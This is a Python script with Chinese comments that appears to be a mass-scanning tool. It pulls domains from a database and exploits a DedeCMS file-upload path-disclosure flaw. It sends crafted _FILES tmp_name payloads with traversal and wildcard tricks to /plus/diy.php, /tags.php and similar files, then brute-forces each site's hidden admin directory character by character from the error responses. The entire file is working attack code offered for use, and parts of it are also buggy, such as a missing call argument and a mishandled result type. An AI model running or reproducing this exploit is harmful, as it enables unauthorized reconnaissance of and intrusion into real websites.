# -*- coding: utf-8 -*-
# 四、查找后台地址
#     status：
#         6：已找到
#         7：未找到 -----单独程序跑后台，找到改为6，失败改为8

import itertools
import traceback
from common import utils
import threading
import requests
from threading import Thread
import time
import tldextract
from unit import dbsqlite



characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#@"
min_group = 0
thread_num = 1
R = threading.Lock()


def get_domains(status, num):
    try:
        R.acquire()
        print("取数据")
        domains = dbsqlite.start_getlist(' status = %s limit %d' % (status,num))
        if len(domains) < min_group:
            return
        d_str = []
        for domain in domains:
            d_str.append(domain[1])
        # dbsqlite.batch_data_update(d_str," status = 9")
        R.release()
        # return [[12,"http://dede.local.com"]]
        return domains
    except Exception as e:
        R.release()


def get_back_url(domain):
    back_dir = ""
    flag = 0
    up_path = "./../{p}<</images/adminico.gif"
    data = {
        "_FILES[mochazz][tmp_name]": up_path,
        "_FILES[mochazz][name]": 0,
        "_FILES[mochazz][size]": 0,
        "_FILES[mochazz][type]": "image/gif"
    }
    site_files = ["/plus/diy.php", "/plus/list.php", "/plus/feedback.php", "/plus/count.php", "/tags.php"]
    try:
        for site_file_path in site_files:
            url = domain + site_file_path
            res = utils.my_requests(url)
            if res and res.status_code == 200:
                target_url = domain + site_file_path
                if site_file_path == "/tags.php":
                    up_path = "./{p}<</images/adminico.gif"
                    data.update({"_FILES[mochazz][tmp_name]": up_path})
                break
        else:
            res = {"domain": domain, "res": False, "info": "找不到上传路径"}
            return res
        for num in range(1, 3):
            if flag:
                break
            for pre in itertools.permutations(characters, num):
                pre = ''.join(list(pre))
                # if pre == "my":
                #     print("1")
                data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
                print("testing", pre)
                r = utils.my_requests(target_url, method="post", data=data)
                data["_FILES[mochazz][tmp_name]"] = up_path
                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                    flag = 1
                    back_dir = pre
                    break
        if not flag:
            res = {"domain": domain, "res": False, "info": "没找到"}
            return res
        print("[+] 前缀为：", back_dir)
        flag = 0
        for i in range(len(characters)):
            if flag:
                break
            for ch in characters:
                if back_dir == "aaaa":
                    res = {"domain": domain, "res": False, "info": "循环错误"}
                    return res
                if ch == characters[-1]:
                    flag = 1
                    break
                data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                r = utils.my_requests(target_url, method="post", data=data)
                data["_FILES[mochazz][tmp_name]"] = up_path
                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                    back_dir += ch
                    print("%s[+]" % domain, back_dir)
                    # print("后台地址为：", domain+"/"+back_dir)
                    break
        res = {"domain": domain, "res": True, "info": back_dir}
        print("后台地址为：", domain + "/" + back_dir)
        return res
    except Exception as e:
        traceback.print_exc()
        res = {"domain": domain, "res": False, "info": "未知错误"}
        return res


def task(i):
    while True:
        try:
            domain = get_domains()
            if not domain:
                print('线程：%d,未查到符合条件数据,等待60s...' % i)
                time.sleep(10)
                continue
            domain = domain[0]
            ress = get_back_url(domain[1])
            for res in ress:
                try:
                    dbsqlite.data_update(res["domain"], "status = %d,des = '%s'" % (6, res["info"]))
                except Exception as e:
                    traceback.print_exc()
        except Exception as e:
            traceback.print_exc()


if __name__ == '__main__':
    # task()
    # try_common("http://www.dedecms.cn")
    try:
        Threads = []
        for i in range(thread_num):
            t = Thread(target=task, args=(i,))
            t.daemon = 1
            Threads.append(t)
            t.start()
        # 启动所有线程
        for i in Threads:
            i.join()
    except Exception as e:
        print(e)